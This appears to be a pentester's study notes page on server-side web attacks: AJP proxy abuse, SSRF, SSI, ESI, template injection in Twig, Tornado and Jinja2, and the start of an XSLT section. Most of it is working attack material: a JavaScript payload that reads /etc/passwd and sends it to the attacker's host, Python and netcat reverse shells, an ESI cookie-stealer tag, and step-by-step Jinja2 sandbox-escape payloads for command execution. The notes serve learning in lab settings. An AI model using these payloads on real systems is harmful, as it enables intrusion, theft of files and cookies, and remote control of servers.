---
title: Notes | Server Side Attacks
author: Zeropio
date: 2022-07-31
categories: [Notes, Vulnerabilities]
tags: [ssrf, ssi, esi, ssti]
permalink: /notes/vulnerabilities/server-side-attacks
---

Server-Side attacks target the application or service provided by a server, whereas the purpose of a client-side attack is to attack the client. These are the types of serve side attacks:
- **Abusing Intermediary Applications**
- **Server-Side Request Forgery** (**SSRF**)
- **Server-Side Includes Injection** (**SSI**)
- **Edge-Side Includes Injection** (**ESI**)
- **Server-Side Template Injection** (**SSTI**)
- **Extensible Stylesheet Language Transformations Server-Side Injection** (**XSLT**)

---

# Abusing Intermediary Applications 

According to Apache, **AJP** (or **JK**) is a wire protocol. It is an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. When we come across an open AJP proxy port (**8009 TCP**), we can use Nginx with the `ajp_module` to access the *hidden* Tomcat Manager. This can be done by compiling the Nginx source code and adding the required module, as follows:
- Download the Nginx source code
- Download the required module
- Compile Nginx source code with the `ajp_module`.
- Create a configuration file pointing to the AJP Port

To download the code and compile it:
```console
zero@pio$ wget https://nginx.org/download/nginx-1.21.3.tar.gz 
zero@pio$ tar -xzvf nginx-1.21.3.tar.gz
zero@pio$ git clone https://github.com/dvershinin/nginx_ajp_module.git; cd nginx-1.21.3 
zero@pio$ sudo apt install libpcre3-dev
zero@pio$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules 
zero@pio$ make
zero@pio$ sudo make install
zero@pio$ nginx -V
```

In `/etc/nginx/conf/nginx.conf`{: .filepath} comment out the entire server block and append the following lines:
```
    upstream tomcats {
        server <SERVER>:<PORT>;
        keepalive 10;
        }
    server {
        listen 80;
        location / {
                ajp_keep_conn on;
                ajp_pass tomcats;
        }
     }
```

> Port 80 can be taken by other service. Change as you wish.
{: .prompt-info}

Start Nginx and check if everything is working correctly by issuing a cURL request to your local host:
```console
zero@pio$ sudo nginx
zero@pio$ curl http://127.0.0.1:80
```

Apache has the AJP module precompiled for us. We will need to install it, though, as it doesn't come in default installations. Configuring the AJP-Proxy in our Apache server can be done as follows:
- Install the libapache2-mod-jk package
- Enable the module
- Create the configuration file pointing to the target AJP-Proxy port

This will be the process:
```console
zero@pio$ sudo apt install libapache2-mod-jk 
zero@pio$ sudo a2enmod proxy_ajp; sudo a2enmod proxy_http 
zero@pio$ export TARGET="<TARGET_IP>" 
zero@pio$ echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf 
zero@pio$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf 
zero@pio$ sudo systemctl start apache2
```

Now we can access the Tomcat Manager with a cURL or even in the browser accessing the localhost. 

--- 

# Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (**SSRF**) attacks allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. Exploiting SSRF vulnerabilities can lead to:
- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

We can usually find SSRF vulnerabilities in applications that fetch remote resources. When hunting for SSRF vulnerabilities, we should look for: 
- Parts of HTTP requests, including URLs
- File imports such as HTML, PDFs, images, etc.
- Remote server connections to fetch data
- API specification imports
- Dashboards including ping and similar functionalities to check server statuses

## Example

This will be the work flow of a SSRF attack. First the enumeration with Nmap:
```console
zero@pio$ nmap -sT -T5 --min-rate=10000 -p- <TARGET> 
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
...
```

Let's cURL the header:
```console
zero@pio$ curl -i -s http://<TARGET>
...
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link. 
...
```

We see a redirection in the parameter `q`. Let's follow it:
```console
zero@pio$ -i -s -L http://<TARGET>
```

The spawned target is an application on the internal network, inaccessible from our current position. The next step is to confirm if the `q` parameter is vulnerable to SSRF. In one terminal, let's use Netcat to listen on port 8080. Now, let us issue a request to the target web application with `http://<OUR IP>` instead of `index.html`{: .filepath} in another terminal, as follows:
```console
zero@pio$ curl -i -s -L http://<TARGET>/load?q=http://<OUR IP>:8080
```

If we see this on our Netcat, there is SSRF:
```console
zero@pio$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [<OUR IP>] from (UNKNOWN) [<TARGET>] 43174
GET / HTTP/1.1
Accept-Encoding: identity
Host: <OUR IP>:8080
User-Agent: Python-urllib/3.8
Connection: close
```

We see that there is a **Python urllib**. This library supports **file**, **http** and **ftp** schemas. Start creating a `index.html`{: .filepath}:
```html
<html>
</body>
<a>SSRF</a>
<body>
<html>
```

Start a HTTP server:
```console
zero@pio$ python3 -m http.server 9000
```

Start a FTP server:
```console
zero@pio$ sudo pip3 install twisted; sudo python3 -m twisted ftp -p 21 -r .
```

Now test the three of them:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=ftp://<OUR IP>/index.html"

HTTP/1.0 200 OK

zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://<OUR IP>:9000/index.html"

HTTP/1.0 200 OK

zero@pio$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 

HTTP/1.0 200 OK
```

> Fetching remote HTML files can lead to Reflected XSS.
{: .prompt-tip}

Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications:
```console
zero@pio$ for port in {1..65535};do echo $port >> ports.txt;done 
zero@pio$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs <NUMBER>
```

If we receive a valid response for some port test it:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000" 

HTTP/1.0 200 OK
```

Let's try aiming for a internal web application, like `internal.app.local`:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"

HTTP/1.0 200 OK
```

Let's try accessing it:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK 
...
<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```

It doesn't understant our request now. This can be because It is filtering the `://`. We can try some payloads to bypass, like `:////`. Try also fuzzing for ports:
```console
zero@pio$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
```

After finding another port, let's see it:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/" 

...
<html><body><h1>Resource: http://127.0.0.1:5000/</h1><a>total 24K
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
 </a></body></html>
```

Now that we can see we have access to the machine files. We can retrieve the file `/proc/self/environ`{: .filepath}:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
```

Inside this file the command `pwd` is executed, so we can know where we are. We can start getting the files enumerated before:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"

...
<html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os
from flask import *
import urllib
import subprocess

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)

def run_command(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = p.stdout.read()
    stderr = p.stderr.read()
    result = stdout.decode() + " " + stderr.decode()
    return result

@app.route("/")
def index():
    return run_command("ls -lha")

@app.route("/runme")
def runmewithargs():
    command = request.args.get("x")
    if command == "":
        return "Use /runme?x=<CMD>"
    return run_command(command)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
</a></body></html>
```

We notice a functionality that allows us to execute commands on the remote host sending a GET request to `/runme?x=<CMD>`:
```console
zero@pio$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
```

Throught the cURL we can't send special characters, like spaces, so we must URL encoding it:
```console
zero@pio$ echo " " | jq -sRr @uri
%20
```

We can create a fast bash script to automatizate it:
```bash
while true; do
        echo -n "# "; read cmd
        ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
        curl -s -o - "http://10.129.24.39/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
        echo ""
        done
```

## Blind SSRF 

Server-Side Request Forgery vulnerabilities can be **blind**. In these cases, even though the request is processed, we can't see the backend server's response. Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations. We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:
- Burp Collaborator 
- [pingb.in](http://pingb.in/) 

Let's do it with an example. Start with an web that can take a file to make a conversion. We see that the app is doing the same with our request, without caring of our file content. Create a file with a link to our machine:
```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```

Start a netcat to listen. We send that file and then receive a request to our netcat:
```console
zero@pio$ nc -lvnp 9000

listening on [any] 9000 ...
connect to [...] from (UNKNOWN) [...] 41524
GET /x?=viaimgtag HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: ...:9000
```

We can see It is using **wkhtmltopdf**. We can execute JavaScript on it. Let's use the following script:
```javascript
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

Send the file with our netcat open, once the code return It will be base64 encode. Let's now upload a reverse shell:
```bash
export RHOST="<OUR IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

URL encoded will be:
```bash
export%2520RHOST%253D%2522<OUR IP>%2522%253Bexport%2520RPORT%253D%2522<PORT>%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
```

URL encoded it and send with the following script:
```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","<URL ENCODED SHELL>", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

## Time-Based SSRF 

We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services. Let us submit the following document to the PDF application of the previous section and observe the response time:
```html
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>
```

We can see in Burp how many times it required to send the request. Then send a valid URL and see the difference. In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.

---

# Server-Side Includes (SSI) Injection

Server-side includes (SSI) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:
```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

The use of SSI on a web application can be identified by checking for extensions such as `.shtml`, `.shtm`, or `.stm`. That said, non-default server configurations exist that could allow other extensions (such as `.html`) to process SSI directives.

For example, if we see a input asking for something, which later will be printed, we can try some of the following:
```html
<!--#echo var="DATE_LOCAL" -->
<!--#printenv -->
```

If this works, the web is vulnerable to SSI Injection. We can try to upload a reverse shell:
```html
<!--#exec cmd="mkfifo /tmp/foo;nc <OUR IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

---

# Edge-Side Includes (ESI) 

**Edge Side Includes** (**ESI**) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content, which would be otherwise unstorable through traditional caching protocols. Although we can identify the use of ESI by inspecting response headers in search for `Surrogate-Control: content="ESI/1.0"`, we usually need to use a blind attack approach to detect if ESI is in use or not. Some useful ESI tags are: 
```html
// Basic detection
<esi: include src=http://<OUR IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<OUR IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

In some cases, we can achieve remote code execution when the application processing ESI directives supports **XSLT**, a dynamic language used to transform XML files. In that case, we can pass `dca=xslt` to the payload. The XML file selected will be processed with the possibility of performing **XML External Entity Injection Attacks** (**XXE**) with some limitations. 

| **Software** | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
|---------------- | --------------- | --------------- | ------------ | --------------- | ------------------ |
| *Squid3* | ✅ | ✅ | ✅ | ✅ | ⬜️ |
| *Varnish Cache* | ✅ | ⬜️ | ⬜️ | ✅ | ✅ |
| *Fastly* | ✅ | ⬜️ | ⬜️ | ⬜️ | ✅ |
| *Akamai ESI Test Server (ETS)* | ✅ | ✅ | ✅ | ⬜️ | ⬜️ |
| *NodeJS esi* | ✅ | ✅ | ✅ | ⬜️ | ⬜️ |
| *NodeJS nodesi* | ✅ | ⬜️ | ⬜️ | ⬜️ | Optional |

---

# Server-Side Template Injections (SSTI)

Template engines read tokenized strings from template documents and produce rendered strings with actual values in the output document. **Server-Side Template Injection** (**SSTI**) is essentially injecting malicious template directives inside a template, leveraging Template Engines that insecurely mix user input with a given template. Take for example the following code:
```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>{{<SOMETHING>}}</h1>
    <p>{{<SOMETHING}}</p>
</body>
</html>
```

With this, a user will receive the title and content from variables, with no user input. But when there is, we can manipulate the template:
```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

@app.route("/hello", methods=['GET'])
def hello():
	name = request.args.get("name")
	if name == None:
		return redirect(f'{url_for("hello")}?name=guest')
	htmldoc = f"""
	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you {name}</a>
	</body>
	</html>
	"""
	return render_template_string(htmldoc)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```

The exploit is simple as:
```console
zero@pio$ curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'

...
<a>Nice to see you 49</a> # <-- Expresion evaluated
```

We can detect SSTI vulnerabilities by injecting different tags in the inputs we control to see if they are evaluated in the response. We don't necessarily need to see the injected data reflected in the response we receive. Sometimes it is just evaluated on different pages (blind). The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:
```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
...
```

The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include `${{<%[%'"}}%\`. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions. We can use some tools like [tplmap](https://github.com/epinna/tplmap). More info in [PortSwigger](https://portswigger.net/research/server-side-template-injection). They provides us with the following path:

![PortSwigger SSTI](/assets/img/notes/vulnerabilities/screen-shot-2015-07-20-at-09-21-56.png)

We must try these payloads guessing which one it is.

## Twig

We can ensure it is **twig** sending `{{_self.env.display("TEST")}}`. **tqlmap** also confirm it:
```console
zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john 

...

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code
```

Twig has a variable `_self`, which makes a few of the internal APIs public. We can use the getFilter function as it allows execution of a user-defined function via the following process:
- Register a function as a filter callback via `registerUndefinedFilterCallback`
- Invoke `_self.env.getFilter()` to execute the function we have just registered

```php
_self.env.registerUndefinedFilterCallback("system")..._self.env.getFilter("id;uname -a;hostname")
```

> Don't forget the `{}
{: .prompt-info}

Let's upload it:
```console
zero@pio$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>
```

Also, we can use **tqlmap** to get access:
```console
zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell
```

> When we notice that the mathematical expressions we submit are evaluated, the application may be vulnerable to XSS as well.
{: .prompt-info}

## Tornado 

Another type is [Tornado](https://www.tornadoweb.org/en/stable/).
```python
<BRACKET>% import os %<BRACKET><BRACKET><BRACKET>os.system('whoami')<BRACKET><BRACKET>
```

**tqlmap** will gave us directly:
```console
zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/' -d email=blah 

...
POST parameter: email
  Engine: Tornado
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code
```

## Jinja2 

After sending `7*'7'` and receaving `7777777` it means it's Jinja2.
```console
zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'

GET parameter: cmd
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code
```

Below is a small dictionary from [fatalerrors.org](https://www.fatalerrors.org/a/0dhx1Dk.html) to refer to when going over the Jinja2 payload development part of this section:

| **Method**   | **Description**    |
|--------------- | --------------- |
| `__class__` | Returns the object (class) to which the type belongs |
| `__mro__` | Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples. |
| `__subclasses__` | Each new class retains references to subclasses, and this method returns a list of references that are still available in the class | 
| `__builtins__` | Returns the builtin methods included in a function | 
| `__globals__` | A reference to a dictionary that contains global variables for a function |
| `__base__` | Returns the base class inherited by the object <-- (`__ base__ and __ mro__` are used to find the base class) |
| `__init__` | Class initialization method |

### Python3 Interpreter 

Before continuing let's take a look at Python:
```console
zero@pio$ python3
...

>>> 
```

Create a string object and use `type` and `__class__`, as follows. Then use the `dir()` command to show all methods and attributes from the object:
```python
>>> import flask
>>> s = 'HI'
>>> type(s)

<class 'str'>


>>> s.__class__

<class 'str'>


>>> dir(s)

['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
```
 
 Using `__mro__` or `mro()`, we can go back up the tree of inherited objects in the Python environment:
 ```python
 >>> s.__class__.__class__

<class 'type'>


>>> s.__class__.__base__

<class 'object'>


>>> s.__class__.__base__.__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
 
 
>>> s.__class__.mro()[1].__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 ```

 Useful classes that can facilitate remote code execution:
 ```python
 >>> x = s.__class__.mro()[1].__subclasses__()
>>> for i in range(len(x)):print(i, x[i].__name__)
...
0 type
1 weakref
2 weakcallableproxy
3 weakproxy
4 int
5 bytearray
6 bytes
7 list
8 NoneType
<SNIP>

>>> def searchfunc(name):
...     x = s.__class__.mro()[1].__subclasses__()
...     for i in range(len(x)):
...             fn = x[i].__name__
...             if fn.find(name) > -1:
...                     print(i, fn)
...
>>> searchfunc('warning')

215 catch_warnings
 ```

 We are searching for `warning` because it imports Python's `sys` module , and from `sys`, the `os` module can be reached. More precisely, os modules are all from `warnings.catch_`. Let's enumerate the builtins from `catch_warnings`:
```python
>>> y = x[215]
>>> y

<class 'warnings.catch_warnings'>


>>> y()._module.__builtins__

{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>,
 <SNIP>


>>> z = y()._module.__builtins__
>>> for i in z:
...     if i.find('import') >-1:
...             print(i, z[i])
...	
__import__ <built-in function __import__>
```

It seems we have reached the import function by walking the hierarchy. This means we can load `os` and use the `system` function to execute code all coming from a string object:
```python
>>> ''.__class__.__mro__[1].__subclasses__()

[215]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
RCE from a string object
0
```

Returning to the vulnerable application, send this payload ` ''.__class__ `:
```console
zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"
```

With the following payload ` ''.__class__.__mro__ `:
```console
zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
```

We are interested in the second item so ` ''.__class__.__mro__[1] `:
```console
zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
```

Let us start walking down the hierarchy ` ''.__class__.__mro__[1].__subclasses__() `:
```console
zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"
```

Let us print out the number and the method names using the following payload:
```python
{% for i in range(450) %} 
{{ i }}
{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
{% endfor %}
```

```console
zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"

...
... 213 WarningMessage  214 catch_warnings  215 date ...
...
```

As you can see in the application's response, `catch_warnings` is located at index `214`. We have everything we need to construct an RCE payload:
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
```

```console
zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"

...
<a>0</a>
...
```

This `0` means that the command got executed. We can identify if test1 was created using the following payload:
```python
''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()
```

```console
zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"
```

We can also used `request` and `lipsum` to create the payload:
```python
request.application.__globals__.__builtins__.__import__('os').popen('id').read()
```

```python
lipsum.__globals__.os.popen('id').read()
```

Now let's create the payload:
```python
''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<OUR IP>",<OUR PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()
```

> ALL THE PYTHON PAYLOADS ARE BETWEEN DOUBLE `{}`
{: .prompt-danger}

---

# Attacking XSLT 

Extensible Stylesheet Language Transformations (**XSLT**) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. XSLT are present in some web applications as standalone functionality, SSI engines, and databases like Oracle. We need to understand the XSLT format to see how the transformation works: 
- The first line is usually the XML version and encoding
- Next, it will have the XSL root node `xsl:stylesheet`
- Then, we will have the directives in `xsl:template match="<PATH>"`. In this case, it will apply to any XML node.
- After that, the transformation is defined for any item in the XML structure matching the previous line.
- To select certain items from the XML document, XPATH language is used in the form of `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>`.

## Transformation through the terminal 

```console
zero@pio$ saxonb-xslt -xsl:transformation.xsl <FILE>.xml 

Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
   <body>
